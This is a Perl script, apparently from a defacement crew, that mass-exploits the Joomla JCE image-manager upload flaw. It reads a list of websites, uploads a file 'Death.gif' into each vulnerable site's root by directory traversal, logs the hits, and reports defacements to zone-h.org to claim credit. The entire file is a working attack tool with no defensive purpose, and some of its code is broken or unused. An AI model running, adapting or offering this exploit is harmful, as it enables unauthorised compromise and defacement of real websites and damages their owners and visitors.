#!/usr/bin/perl

#Jce Mass Exploiter Coded By Dr.S4mom
#Uptade by Death Student
# sh00tz > all friends

use Term::ANSIColor;
use Win32::Console::ANSI;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);
print"\n";
print colored (" 		--=[JCE Auto Explo!ter]",'bold blue'),"\n";
print colored ("     		--=[Code by Dr.S4mom]",'bold red'),"\n"; 
print colored ("     		--=[Update by Death Student ]",'bold yellow'),"\n"; 
print"\n";
print colored (" [WEBSITE LIST]: ",'bold white');
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die ">>>Can't open the Website list<<< !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

foreach $site(@TARGETS){

chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

print colored ("\n [EXPLOIT LOAD] $site\n",'bold yellow');sleep(1);


$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){

print colored (" [UPLOAD]",'bold green'),"\n";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["Death.gif"],
        'action' => 'upload'

        ]
    )->decoded_content;


$remote = IO::Socket::INET->new(
        Proto=>
        PeerAddr=>"$site",
        PeerPort=>
        Timeout=>
        );
$def= "$site/Death.gif";
print colored (" [EXPLOIT SUCESS] $site/Death.gif\n",'bold red');sleep(1);

}else{
print colored (" [EXPLOIT FAIL]",'bold blue'),"\n";sleep(1);
}
	open(save, '>>list.txt');
	
    print save "$site/Death.gif\n";
	
    close(save);
}
sub zonpost{
$req = HTTP::Request->new(GET=>$link);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$ar = $response->content;
if ($ar =~ /Hacked|Death/){

				$dmn= $link;
				$def="Death";
				$zn="http://zone-h.org/notify/single";
				$lwp=LWP::UserAgent->new;
				$res=$lwp  -> post($zn,[
				'defacer'     => $def,
				'domain1'   => $dmn,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print colored ("UPLOAD ZONE-H SUCESS $1",'bold green'),"\n";
				}
				else
				{
				print colored ("ZONE-H ERROR UPLOAD",'bold white'),"\n";
				}
				     }else{
						print" Not Defaced !! \n";

}
}
